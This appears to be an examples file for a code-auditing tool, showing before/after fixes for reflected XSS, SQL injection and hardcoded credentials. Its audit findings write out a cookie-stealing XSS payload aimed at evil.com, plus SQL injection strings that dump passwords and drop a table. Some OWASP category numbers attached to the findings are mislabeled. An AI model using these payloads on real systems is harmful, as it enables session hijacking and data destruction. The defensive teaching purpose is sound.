# Sovereign Security Auditor -- Examples

Real-world before/after examples showing how the auditor identifies and fixes vulnerabilities.

---

## Example 1: Cross-Site Scripting (XSS) Fix

### Before -- Vulnerable Express.js Route

```javascript
// routes/search.js
const express = require('express');
const router = express.Router();

router.get('/search', (req, res) => {
  const query = req.query.q;
  // VULNERABLE: User input reflected directly into HTML
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
        <div id="results">No results found.</div>
      </body>
    </html>
  `);
});

module.exports = router;
```

### Audit Finding

```
### [HIGH] Reflected XSS via Search Query Parameter

**Category:** OWASP A07 -- Cross-Site Scripting (XSS)
**Location:** `routes/search.js:7`
**Language:** JavaScript

**Issue:**
User-supplied query parameter `q` is interpolated directly into the HTML
response without sanitization or encoding. An attacker can inject arbitrary
JavaScript that executes in the victim's browser.

**Attack Vector:**
GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

**Impact:**
- Session hijacking via cookie theft
- Keylogging and credential harvesting
- Defacement of the page for phishing
- Execution of arbitrary actions as the victim user

**References:**
- CWE-79: Improper Neutralization of Input During Web Page Generation
- https://owasp.org/www-community/attacks/xss/
```

### After -- Fixed Code

```javascript
// routes/search.js
const express = require('express');
const router = express.Router();

// Use a proper HTML escaping function
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return String(text).replace(/[&<>"']/g, (m) => map[m]);
}

router.get('/search', (req, res) => {
  const query = req.query.q || '';

  // Input validation: limit length, strip control characters
  const sanitizedQuery = escapeHtml(query.slice(0, 200));

  res.send(`
    <html>
      <head>
        <meta http-equiv="Content-Security-Policy"
              content="default-src 'self'; script-src 'none'">
      </head>
      <body>
        <h1>Search Results for: ${sanitizedQuery}</h1>
        <div id="results">No results found.</div>
      </body>
    </html>
  `);
});

module.exports = router;
```

**What changed:**
1. User input is HTML-encoded before rendering (all `<`, `>`, `"`, `'`, `&` escaped)
2. Input length is capped at 200 characters
3. Content-Security-Policy header blocks inline script execution as defense-in-depth
4. Ideally, use a template engine with auto-escaping (EJS with `<%= %>`, Handlebars with `{{ }}`)

---

## Example 2: SQL Injection Fix

### Before -- Vulnerable Python Flask Endpoint

```python
# app.py
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/api/users')
def get_user():
    user_id = request.args.get('id')
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()

    # VULNERABLE: String formatting in SQL query
    query = f"SELECT id, name, email FROM users WHERE id = {user_id}"
    cursor.execute(query)

    row = cursor.fetchone()
    conn.close()

    if row:
        return jsonify({"id": row[0], "name": row[1], "email": row[2]})
    return jsonify({"error": "User not found"}), 404
```

### Audit Finding

```
### [CRITICAL] SQL Injection via User ID Parameter

**Category:** OWASP A01 -- Injection
**Location:** `app.py:14`
**Language:** Python

**Issue:**
The `user_id` parameter from the query string is inserted directly into
a SQL query using an f-string. This allows an attacker to execute arbitrary
SQL statements against the database.

**Attack Vector:**
GET /api/users?id=1 UNION SELECT id, password, email FROM users--

This returns all user passwords instead of a single user record.

GET /api/users?id=1; DROP TABLE users;--

This destroys the entire users table.

**Impact:**
- Full database read access (data exfiltration)
- Data modification or deletion
- Authentication bypass
- Potential remote code execution via database-specific functions (e.g., xp_cmdshell)

**References:**
- CWE-89: Improper Neutralization of Special Elements in SQL Command
- https://owasp.org/www-community/attacks/SQL_Injection
```

### After -- Fixed Code

```python
# app.py
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/api/users')
def get_user():
    user_id = request.args.get('id')

    # Input validation: ensure user_id is a valid integer
    if not user_id:
        return jsonify({"error": "Missing id parameter"}), 400
    try:
        user_id_int = int(user_id)
    except ValueError:
        return jsonify({"error": "Invalid id format"}), 400

    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()

    # FIXED: Parameterized query -- the database driver handles escaping
    cursor.execute(
        "SELECT id, name, email FROM users WHERE id = ?",
        (user_id_int,)
    )

    row = cursor.fetchone()
    conn.close()

    if row:
        return jsonify({"id": row[0], "name": row[1], "email": row[2]})
    return jsonify({"error": "User not found"}), 404
```

**What changed:**
1. Input validation: `user_id` is parsed as an integer before use, rejecting non-numeric input
2. Parameterized query: `?` placeholder with tuple parameter lets SQLite handle escaping
3. Explicit error handling for missing/invalid input with proper HTTP status codes
4. The database driver now separates data from query logic, making injection impossible

---

## Example 3: Exposed Credentials Fix

### Before -- Secrets Committed to Repository

```javascript
// config/database.js
module.exports = {
  production: {
    host: 'prod-db.company.internal',
    port: 5432,
    database: 'myapp_production',
    username: 'admin',
    password: 'Sup3rS3cret!Pr0d@2024',
    ssl: true
  },
  stripe: {
    secretKey: 'sk_live_51H7bVnKj8eMwqPzR4x9cT2fG6yN8mAqW3dL5vBk7jX',
    webhookSecret: 'whsec_8Kx4mNpQ2rT7vYzA1bC3dE5fG6hJ8kL9'
  },
  aws: {
    accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
    secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    region: 'us-east-1'
  },
  jwt: {
    secret: 'my-jwt-secret-do-not-share'
  }
};
```

```yaml
# docker-compose.yml
version: '3.8'
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: Sup3rS3cret!Pr0d@2024
      POSTGRES_USER: admin
```

```
# .gitignore (MISSING .env)
node_modules/
dist/
```

### Audit Finding

```
### [CRITICAL] Production Credentials Hardcoded in Source Code

**Category:** OWASP A03 -- Sensitive Data Exposure
**Location:** `config/database.js:1-23`, `docker-compose.yml:7-8`
**Language:** JavaScript, YAML

**Issue:**
Production database password, Stripe live API keys, AWS access keys, and
JWT secret are all hardcoded in source files. These are committed to version
control and visible to anyone with repository access. Even if the repo is
private, this violates the principle of least privilege and creates risk if
the repo is ever leaked, forked, or accessed by a compromised account.

**Credentials Found:**
1. Database password: `Sup3rS3cret!Pr0d@2024` (database.js:7, docker-compose.yml:8)
2. Stripe live secret key: `sk_live_51H7b...` (database.js:11)
3. Stripe webhook secret: `whsec_8Kx4m...` (database.js:12)
4. AWS access key ID: `AKIAIOSFODNN7EXAMPLE` (database.js:15)
5. AWS secret access key: `wJalrXUtn...` (database.js:16)
6. JWT signing secret: `my-jwt-secret-do-not-share` (database.js:20)

**Impact:**
- Full database access (read, modify, delete all data)
- Financial loss via Stripe key misuse (charges, refunds, customer data)
- Full AWS account takeover (launch instances, access S3, escalate privileges)
- JWT forgery allowing authentication bypass for any user

**References:**
- CWE-798: Use of Hard-coded Credentials
- CWE-312: Cleartext Storage of Sensitive Information
```

### After -- Fixed Code

```javascript
// config/database.js
module.exports = {
  production: {
    host: process.env.DB_HOST,
    port: parseInt(process.env.DB_PORT || '5432', 10),
    database: process.env.DB_NAME,
    username: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    ssl: process.env.DB_SSL === 'true'
  },
  stripe: {
    secretKey: process.env.STRIPE_SECRET_KEY,
    webhookSecret: process.env.STRIPE_WEBHOOK_SECRET
  },
  aws: {
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    region: process.env.AWS_REGION || 'us-east-1'
  },
  jwt: {
    secret: process.env.JWT_SECRET
  }
};

// Validate required environment variables at startup
const required = [
  'DB_HOST', 'DB_NAME', 'DB_USER', 'DB_PASSWORD',
  'STRIPE_SECRET_KEY', 'JWT_SECRET'
];
for (const key of required) {
  if (!process.env[key]) {
    console.error(`FATAL: Missing required environment variable: ${key}`);
    process.exit(1);
  }
}
```

```yaml
# docker-compose.yml
version: '3.8'
services:
  db:
    image: postgres:15
    env_file:
      - .env
    environment:
      POSTGRES_PASSWORD: ${DB_PASSWORD}
      POSTGRES_USER: ${DB_USER}
```

```
# .env.example (commit this -- shows required vars without values)
DB_HOST=localhost
DB_PORT=5432
DB_NAME=myapp
DB_USER=
DB_PASSWORD=
STRIPE_SECRET_KEY=
STRIPE_WEBHOOK_SECRET=
JWT_SECRET=
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_REGION=us-east-1
```

```
# .gitignore (updated)
node_modules/
dist/
.env
.env.local
.env.production
.env.staging
*.pem
*.key
```

**What changed:**
1. All secrets moved to environment variables (`process.env.*`)
2. `.env` added to `.gitignore` so secrets are never committed
3. `.env.example` committed as a template showing required variables
4. Startup validation ensures the app fails fast if secrets are missing
5. Docker Compose reads from `.env` file instead of hardcoded values
6. **Post-fix action required:** Rotate ALL exposed credentials immediately (database password, Stripe keys, AWS keys, JWT secret). They must be considered compromised since they were in version control.

---

## License

MIT
